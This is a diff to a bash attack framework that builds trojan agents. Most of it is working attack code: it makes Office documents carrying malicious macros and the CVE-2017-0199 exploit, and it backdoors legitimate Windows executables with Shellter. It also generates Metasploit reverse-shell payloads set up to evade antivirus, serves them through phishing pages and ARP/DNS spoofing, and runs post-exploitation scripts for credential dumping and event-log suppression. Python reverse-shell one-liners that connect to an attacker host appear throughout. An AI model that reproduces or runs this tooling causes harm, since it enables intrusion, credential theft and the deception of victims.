+          sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
+          sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+          else
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
+
+        else
+
+
+        echo "- ATTACK VECTOR: http://$lhost"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
+            sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
+        fi
+   fi
+
+
+else
+
+  echo "[x] Abort execution .."
+  sleep 2
+fi
+
+
+sleep 2
+# CLEANING EVERYTHING UP
+echo "[☠] Cleanning temp generated files..."
+rm $ApAcHe/$N4m.py > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+rm $IPATH/output/routine > /dev/null 2>&1
+sleep 2
+clear
+cd $IPATH/
+}
+
+
+
+
+
+
+
+sh_world () {
+# module description
+cat << !
+
+    ╔─────────────────────────────────────────────────────────────╗
+    |     This module builds microsoft world executable agents    |
+    |        *  agents available: docm | ppsx | rtf  *            |
+    ╚─────────────────────────────────────────────────────────────╝
+
+!
+sleep 1
+QuE=$(zenity --question --title "☠ MICROSOFT WORD PAYLOADS ☠" --text "run module?" --width 220) > /dev/null 2>&1
+     if [ "$?" -eq "0" ]; then
+
+# module description
+clear
+cat << !
+
+    ╔─────────────────╦───────────╦────────────╦──────────────────╗
+    |  OPTIONS BUILD  | TARGET OS |   FORMAT   |      OUTPUT      |
+    ╠─────────────────╩───────────╩────────────╩──────────────────╣
+    | a - shellcode     multi OS     C,PYTHON       DOCM(word)    |
+    | b - shellcode     windows      PYTHON         PPSX(word)    |
+    | c - shellcode     windows      C              RTF(word)     |
+    ╠─────────────────────────────────────────────────────────────╣
+    |  M - return to main menu                                    |
+    ╚─────────────────────────────────────────────────────────────╝
+
+!
+echo "[☠] Shellcode Generator"
+sleep 1
+echo -n "[➽] Chose Your Venom:"
+read choice
+case $choice in
+a) sh_world23 ;;
+b) sh_world24 ;;
+c) sh_world25 ;;
+M) sh_menu ;;
+m) sh_menu ;;
+*) echo "\"$choice\": is not a valid Option"; sleep 2; clear; sh_world ;;
+esac
+
+  else
+   echo "[x] Abort execution .."
+   sleep 2
+   clear
+ fi
+}
+
+
+
+
 # ---------------------------------------------------
 # astrobaby word macro trojan payload (windows.c) OR
 # exploit/multi/fileformat/office_word_macro (python)
 # ---------------------------------------------------
-sh_shellcode23 () {
+sh_world23 () {
 # get user input to build shellcode
 echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
@@ -5910,9 +7825,8 @@ cat << !
       exit
    fi
 
-
    # check if mingw32 exists
-   c0m=`which i686-w64-mingw32-gcc`> /dev/null 2>&1
+   c0m=`which $ComP`> /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
       echo "[☠] mingw32 compiler -> found!"
       sleep 2
@@ -5939,8 +7853,8 @@ sleep 2
 # compiling template (windows systems)
 echo "[☠] Compiling using mingw32 .."
 sleep 2
-# i686-w64-mingw32-gcc astrobaby.c -o payload.exe -lws2_32 -mwindows
-$ComP astrobaby.c -o payload.exe -mwindows
+# i686-w64-mingw32-gcc astr0baby.c -o payload.exe -lws2_32 -mwindows
+$ComP astrobaby.c -o payload.exe -lws2_32 -mwindows
 strip payload.exe > /dev/null 2>&1
 mv payload.exe $IPATH/output/$N4m.exe > /dev/null 2>&1
 echo "[☠] Binary: $IPATH/output/$N4m.exe .."
@@ -5984,6 +7898,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -5997,10 +7912,47 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
 
 if [ "$Targ" = "WINDOWS" ]; then
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 290) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1
 else
 P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 220) > /dev/null 2>&1
 fi
+
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+  fi
+
 
 
       # edit files nedded
@@ -6036,6 +7988,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -6065,6 +8018,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -6083,6 +8037,7 @@ rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/$N4m.exe > /dev/null 2>&1
 rm $ApAcHe/$N4m.docm > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -6095,7 +8050,7 @@ cd $IPATH/
 # ms14_064_packager_python
 # Windows 7 SP1 with Python for Windows / Office 2010 SP2 / Office 2013
 # ---------------------------------------------------------------------
-sh_shellcode24 () {
+sh_world24 () {
 # get user input to build shellcode
 echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
@@ -6169,6 +8124,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -6181,7 +8137,43 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 290) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1
+
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+  fi
 
 
       # edit files nedded
@@ -6217,6 +8209,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -6246,6 +8239,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -6262,10 +8256,113 @@ mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.ppsx > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
 }
+
+
+
+
+
+# ---------------------------------------------------------------------
+# cve2017-0199
+# ---------------------------------------------------------------------
+sh_world25 () {
+# get user input to build shellcode
+echo "[☠] Enter shellcode settings!"
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" --width 350 --height 230) > /dev/null 2>&1
+N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
+
+
+# display final settings to user
+cat << !
+
+ shellcode settings
++------------------
+| LPORT   : $lport
+| LHOST   : $lhost
+| FORMAT  : C,SSL/TLS -> WINDOWS(RTF)
+| PAYLOAD : $paylo
+|_AGENT   : $IPATH/output/$N4m.rtf
+
+
+!
+sleep 1
+  #
+  # check if all dependencies needed are installed
+  # check if template exists
+  #
+  if [ -d $IPATH/templates/CVE-2017-0199 ]; then
+     echo "[☠] CVE-2017-0199_toolkit -> found!"
+     sleep 2
+  else
+     echo "[☠] CVE-2017-0199_toolkit -> not found!"
+     exit
+  fi
+
+
+
+#
+# build cve-2017-0199 RTF agent ..
+# python cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.doc -x 1
+#
+echo "[☠] Generating MS_word agent .."
+sleep 2
+cd $IPATH/templates/CVE-2017-0199
+xterm -T " SHELLCODE GENERATOR " -geometry 110x10 -e "python cve-2017-0199_toolkit.py -M gen -w $N4m.rtf -u http://$lhost:8080/logo.doc -x 1 && sleep 2" > /dev/null 2>&1
+mv $IPATH/templates/CVE-2017-0199/$N4m.rtf $IPATH/output/$N4m.rtf
+echo "[☠] Agent: $IPATH/output/$N4m.rtf .."
+sleep 2
+
+
+#
+# build msf payload ..
+#
+echo "[☠] build C,SSL/TLS payload .."
+sleep 2
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport PayloadUUIDTracking=true HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --smallest -f exe -o /tmp/shell.exe" > /dev/null 2>&1
+
+
+  #
+  # deliver agent.rtf using apache2
+  #
+  cd $IPATH/templates/phishing
+  cp $InJEc12 mega[bak].html
+  sed "s|NaM3|$N4m.rtf|g" mega.html > copy.html
+  cp copy.html $ApAcHe/index.html > /dev/null 2>&1
+  cd $IPATH/output
+  cp $N4m.rtf $ApAcHe/$N4m.rtf > /dev/null 2>&1
+    echo "[☠] loading -> Apache2Server!"
+    echo "---"
+    echo "- SEND THE URL GENERATED TO TARGET HOST"
+    echo "- ATTACK VECTOR: http://$lhost"
+    echo "---"
+
+    cd $IPATH/templates/CVE-2017-0199
+    # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+    echo "[☠] start CVE-2017-0199_toolkit + payload handler"
+    echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+    echo "[☯] Please dont test samples on virus total..."
+   echo ""
+   xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T "CVE-2017-0199_toolkit" -geometry 124x10 -e "python cve-2017-0199_toolkit.py -M exp -p 8080 -e http://$lhost:8080/shell.exe -l /tmp/shell.exe"
+
+
+sleep 2
+# CLEANING EVERYTHING UP
+echo "[☠] Cleanning temp generated files..."
+rm /tmp/shell.exe > /dev/null 2>&1
+rm $ApAcHe/shell.exe > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
+rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
+sleep 2
+clear
+cd $IPATH/
+}
+
 
 
 
@@ -6277,20 +8374,20 @@ sh_buildin () {
 # module description
 cat << !
 
-    ╔──────────────────────────────────────────────────────────────╗
-    | This module uses system built-in tools sutch as bash, netcat |
-    |ssh, python, perl, etc, and use them to spaw a tcp connection |
-    ╚──────────────────────────────────────────────────────────────╝
+    ╔─────────────────────────────────────────────────────────────╗
+    | This module uses system built-in tools sutch as bash, netcat|
+    |ssh, python, perl, etc, and use them to spaw a tcp connection|
+    ╚─────────────────────────────────────────────────────────────╝
 
 !
 sleep 2
-QuE=$(zenity --question --title "☠ BUILT-IN SHELL GENERATOR ☠" --text "RUN BUILT-IN SHELL GENERATOR?" --width 350) > /dev/null 2>&1
+QuE=$(zenity --question --title "☠ BUILT-IN SHELL GENERATOR ☠" --text "run module?" --width 220) > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
 
        sh_stage2
 
       else
-        echo "[x] Abort ...."
+        echo "[x] Abort execution .."
         sleep 2
         clear
       fi
@@ -6392,7 +8489,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- SHELL   : import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK"
      echo "-           _STREAM);s.connect(('$lhost',$lport));os.dup2(s.fileno(),0); os.dup2"
      echo "-           (s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
-     echo "- EXECUTE : press twice in $N4m to execute!"
+     echo "- EXECUTE : python $N4m.py"
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
@@ -6421,7 +8518,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "-           (('$lhost',$lport)) while 1: proc = subprocess.Popen(s.recv(1024),"
      echo "-           shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,"
      echo "-           stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())"
-     echo "- EXECUTE : press twice in $N4m to execute!"
+     echo "- EXECUTE : python $N4m.py"
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
@@ -6532,7 +8629,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
    else
 
 
-     echo "[x] Abort ...."
+     echo "[x] Abort execution .."
      sleep 2
      clear
    fi
@@ -6563,6 +8660,310 @@ exit
 
 
 
+
+
+
+
+
+
+
+
+#
+# Shellter dynamic PE injector by: kyREcon
+#
+# HINT: accepts only legit executables and backdoor them with shellcode ..
+# https://nodistribute.com/result/3UgXTM2Jp9 (0/39)
+# https://www.virustotal.com/en/file/efe674192c87df5abce19b4ef7fa0005b7597a3de70d4ca1b34658f949d3df3e/analysis/1498501144/ (1/61)
+#
+sh_shellcode25 () {
+
+# module description
+cat << !
+
+    ╔─────────────────────────────────────────────────────────────╗
+    | This module uses Shellter in order to inject shellcode into |
+    |  native Windows applications building trojan horses agents  |
+    |                                                             |
+    |  Detection ratio:                                           |
+    |  https://nodistribute.com/result/3UgXTM2Jp9                 |
+    ╚─────────────────────────────────────────────────────────────╝
+
+!
+sleep 2
+# run module or abort ? 
+QuE=$(zenity --question --title="☠ Shellter - dynamic PE injector ☠" --text "Author: kyREcon\nRun shellter module?" --width 240) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+#
+# checking for wine install ..
+#
+vinho=`which wine`
+if [ "$?" -eq "0" ]; then
+  echo "[✔] wine installation found .."
+  sleep 2
+else
+  echo "[x] wine installation NOT FOUND .."
+  sleep 2
+  sudo apt-get install wine
+fi
+
+#
+# checking if shellter its installed ..
+#
+if [ -e "$IPATH/obfuscate/shellter/shellter.exe" ]; then
+  echo "[✔] shellter installation found .."
+  sleep 2
+else
+  echo "[x] shellter installation NOT FOUND .."
+  sleep 2
+fi
+
+  #
+  # config settings needed by shellter ..
+  #
+    echo "[☠] Enter shellcode settings!"
+    cd $IPATH/obfuscate/shellter
+    LhOst=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+    LpOrt=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+    appl=$(zenity --title "☠ Shellter - Chose file to be backdoored ☠" --filename=$IPATH/ --file-selection) > /dev/null 2>&1
+    paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "meterpreter_reverse_tcp" FALSE "meterpreter_reverse_http" FALSE "meterpreter_reverse_https" --width 350 --height 230) > /dev/null 2>&1
+
+
+   #
+   # grab only the executable name from the full path
+   # ^/ (search for expression) +$ (print only last espression)
+   #
+   echo "$appl" > test.txt
+   N4m=`grep -oE '[^/]+$' test.txt` > /dev/null 2>&1
+   rm test.txt > /dev/null 2>&1
+
+
+    #
+    # copy files generated to output folder ..
+    #
+    cp $appl $IPATH/obfuscate/shellter
+    chown $user $N4m > /dev/null 2>&1
+    echo "[✔] Files Successfully copy to shellter .."
+    sleep 2
+
+
+# display final settings to user
+cat << !
+
+ shellcode settings
++------------------
+| LPORT   : $LpOrt
+| LHOST   : $LhOst
+| PAYLOAD : $paylo
+|_AGENT   : $IPATH/output/$N4m
+
+
+!
+
+  #
+  # in ubuntu distros we can not run shellter.exe in wine with root privs
+  # so we need to run it in the context of a normal user...
+  #
+  su $user -c "$arch shellter.exe -a -f $N4m --stealth -p $paylo --lhost $LhOst --port $LpOrt"
+  echo ""
+    #
+    # clean recent files ..
+    #
+    rm *.bak > /dev/null 2>&1
+    mv $N4m $IPATH/output > /dev/null 2>&1
+    #
+    # config correct payload arch  ..
+    #
+      if [ "$paylo" = "meterpreter_reverse_tcp" ]; then
+        msf_paylo="windows/meterpreter/reverse_tcp"
+      elif [ "$paylo" = "meterpreter_reverse_http" ]; then
+        msf_paylo="windows/meterpreter/reverse_http"
+      elif [ "$paylo" = "meterpreter_reverse_https" ]; then
+        msf_paylo="windows/meterpreter/reverse_https"
+      else
+        echo "[x] abort execution .."
+        sleep 2
+        sh_menu
+      fi
+
+#
+# CHOSE HOW TO DELIVER YOUR PAYLOAD
+#
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1
+
+
+   if [ "$serv" = "multi-handler (default)" ]; then
+      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
+          sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'"
+        fi
+      sleep 2
+
+
+   else
+
+
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+  fi
+
+
+      # edit files nedded
+      cd $IPATH/templates/phishing
+      cp $InJEc12 mega[bak].html
+      sed "s|NaM3|$N4m|g" mega.html > copy.html
+      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
+      cd $IPATH/output
+      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
+      echo "[☠] loading -> Apache2Server!"
+      echo "---"
+      echo "- SEND THE URL GENERATED TO TARGET HOST"
+
+        if [ "$D0M4IN" = "YES" ]; then
+        # copy files nedded by mitm+dns_spoof module
+        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
+        cp $IPATH/output/$N4m $ApAcHe/$N4m
+        echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+          if [ "$MsFlF" = "ON" ]; then
+          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $msf_paylo; set LHOST $LhOst; set LPORT $LpOrt; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
+          sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+          else
